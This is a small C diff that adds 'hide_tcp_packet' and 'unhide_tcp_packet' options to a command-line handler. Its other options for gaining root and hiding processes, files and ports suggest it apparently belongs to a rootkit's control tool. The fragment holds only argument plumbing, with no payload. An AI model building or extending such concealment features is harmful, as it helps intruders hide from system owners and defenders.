@@ -329,7 +329,8 @@ int main(int argc, char **argv)
     handle_command_line_arguments(argc, argv, &root, 
                                   &hide_pid, &unhide_pid, &pid, &hide_file, &unhide_file, &file,
                                   &hide_tcp_port, &unhide_tcp_port, &hide_tcp6_port, &unhide_tcp6_port,
-                                  &hide_udp_port, &unhide_udp_port, &hide_udp6_port, &unhide_udp6_port, 
+                                  &hide_udp_port, &unhide_udp_port, &hide_udp6_port, &unhide_udp6_port,
+                                  &hide_tcp_packet, &unhide_tcp_packet,
                                   &port, &ip, &hide, &unhide, &protect, &unprotect);
 
     size_t buf_size = 0;
